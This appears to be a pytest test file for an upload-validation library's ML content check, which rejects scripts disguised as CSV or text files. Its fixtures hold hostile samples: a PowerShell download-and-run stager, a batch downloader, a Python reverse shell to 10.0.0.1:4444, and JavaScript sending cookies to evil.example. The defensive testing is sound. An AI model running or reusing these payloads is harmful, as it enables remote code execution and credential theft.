"""MagikaCheck: an ML second opinion that can only veto (skipped without magika)."""

from __future__ import annotations

import threading
from typing import Any

import pytest

pytest.importorskip("magika")

from tests.support import corpus
from uploadshield import Policy, Upload, presets, validate
from uploadshield.checks import magika as magika_check
from uploadshield.checks.magika import MagikaCheck

POWERSHELL = (
    b"$client = New-Object System.Net.WebClient\n"
    b"$client.DownloadFile('http://evil.example/x.exe', \"$env:TEMP\\x.exe\")\n"
    b'Start-Process "$env:TEMP\\x.exe"\n'
)
BATCH = b'@echo off\r\nset URL=http://evil.example/p.exe\r\npowershell -c "iwr %URL%"\r\n'
PYTHON = (
    b"import os, socket, subprocess\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))\n"
    b"subprocess.call(['/bin/sh', '-i'], stdin=s.fileno())\n"
)
JAVASCRIPT = (
    b"const http = require('http');\n"
    b"function steal(){ fetch('https://evil.example/?c=' + document.cookie); }\nsteal();\n"
)
TEXT_POLICY = presets.DOCUMENTS.extend(checks=[MagikaCheck()])


def run(data: bytes, name: str, policy: Policy = TEXT_POLICY) -> Any:
    return validate(Upload.from_bytes(data, name), policy)


@pytest.mark.parametrize(
    ("data", "name", "label"),
    [
        (POWERSHELL, "report.csv", "powershell"),
        (BATCH, "notes.txt", "batch"),
        (PYTHON, "data.csv", "python"),
        (JAVASCRIPT, "readme.txt", "javascript"),
    ],
)
def test_scripts_disguised_as_data_are_vetoed(data: bytes, name: str, label: str) -> None:
    without = run(data, name, presets.DOCUMENTS)
    assert without.ok  # deterministic sniffing can only prove "this is text"
    result = run(data, name)
    assert result.codes == ("content_mismatch",)
    details = result.violations[0].details
    assert details["magika_label"] == label
    assert details["score"] >= 0.9
    assert details["model"].startswith("standard_")
    assert details["detected_type"] in {"text/csv", "text/plain"}


@pytest.mark.parametrize(
    ("data", "name"),
    [
        (b"name,amount,date\nalice,10,2024-01-01\nbob,20,2024-01-02\n" * 5, "export.csv"),
        (b"Meeting notes\n\nWe agreed to ship the new upload pipeline next month.\n", "a.txt"),
        (corpus.pdf(), "a.pdf"),
        (corpus.ooxml("docx"), "a.docx"),
        (corpus.odt(), "a.odt"),
    ],
)
def test_benign_documents_pass(data: bytes, name: str) -> None:
    result = run(data, name)
    assert result.ok, result.violations
    assert "magika" in result.checks_run


@pytest.mark.parametrize(
    ("data", "name"),
    [(corpus.png(), "a.png"), (corpus.image("JPEG"), "a.jpg"), (corpus.animated_gif(), "a.gif")],
)
def test_benign_images_pass(data: bytes, name: str) -> None:
    assert run(data, name, presets.IMAGES.extend(checks=[MagikaCheck()])).ok


def test_explicitly_allowed_types_are_not_vetoed() -> None:
    html = b"<!DOCTYPE html><html><head><title>t</title></head><body><p>Hello</p></body></html>\n"
    policy = Policy(allowed_types={"text/html"}, checks=(MagikaCheck(),))
    result = run(html, "page.html", policy)
    assert result.ok, result.violations  # Magika says "html", the policy allows HTML


def test_options_are_honoured() -> None:
    lenient = presets.DOCUMENTS.extend(checks=[MagikaCheck(forbidden=frozenset({"batch"}))])
    assert run(POWERSHELL, "a.csv", lenient).ok
    assert run(BATCH, "a.txt", lenient).codes == ("content_mismatch",)
    impossible = presets.DOCUMENTS.extend(checks=[MagikaCheck(min_score=1.0)])
    assert run(PYTHON, "a.csv", impossible).ok  # scored below 1.0
    with pytest.raises(ValueError, match="prediction mode"):
        MagikaCheck(prediction_mode="high-confidence")
    with pytest.raises(ValueError, match="min_score"):
        MagikaCheck(min_score=2)


def test_policies_with_magika_serialise_into_migrations() -> None:
    from django.db.migrations.writer import MigrationWriter

    from uploadshield.django import FileValidator

    validator = FileValidator(
        presets.PDF.extend(checks=[MagikaCheck(min_score=0.95, prediction_mode="best_guess")])
    )
    code, imports = MigrationWriter.serialize(validator)
    assert "uploadshield.checks.MagikaCheck(" in code
    namespace: dict[str, Any] = {}
    exec("\n".join(sorted(imports)) + f"\nvalue = {code}", namespace)  # noqa: S102
    assert namespace["value"] == validator


def test_magika_failures_fail_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    class Broken:
        def identify_stream(self, stream: Any) -> Any:
            raise OSError("model file missing")

    monkeypatch.setitem(magika_check._models, "high_confidence", Broken())
    result = run(b"a,b\n1,2\n", "a.csv")
    assert result.codes == ("check_failed",)


def test_one_model_per_process_and_thread_safe(monkeypatch: pytest.MonkeyPatch) -> None:
    import magika

    created: list[object] = []
    real = magika.Magika

    class Counting(real):  # type: ignore[misc, valid-type]
        def __init__(self, *args: Any, **kwargs: Any) -> None:
            created.append(self)
            super().__init__(*args, **kwargs)

    monkeypatch.setattr(magika, "Magika", Counting)
    monkeypatch.setattr(magika_check, "_models", {})
    results: list[tuple[str, ...]] = []
    barrier = threading.Barrier(8)

    def worker() -> None:
        barrier.wait()
        results.append(run(POWERSHELL, "a.csv").codes)

    threads = [threading.Thread(target=worker) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert results == [("content_mismatch",)] * 8
    assert len(created) == 1


def test_rejection_status_is_415() -> None:
    from django.test import Client, override_settings

    from tests.django_site.settings import UPLOADSHIELD

    config = {**UPLOADSHIELD, "DEFAULT_POLICY": TEXT_POLICY}
    with override_settings(UPLOADSHIELD=config):
        from django.core.files.uploadedfile import SimpleUploadedFile

        response = Client().post(
            "/plain/",
            {"file": SimpleUploadedFile("report.csv", POWERSHELL)},
            headers={"Accept": "application/json"},
        )
    assert response.status_code == 415
    error = response.json()["files"][0]["errors"][0]
    assert error == {
        "code": "content_mismatch",
        "message": "The file's content looks like Powershell source, which is not allowed here.",
    }


def test_unanalysable_results_fail_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    class NotOk:
        ok = False
        status = "unknown_error"

    class Model:
        def identify_stream(self, stream: Any) -> Any:
            return NotOk()

    monkeypatch.setitem(magika_check._models, "high_confidence", Model())
    assert run(b"a,b\n1,2\n", "a.csv").codes == ("check_failed",)
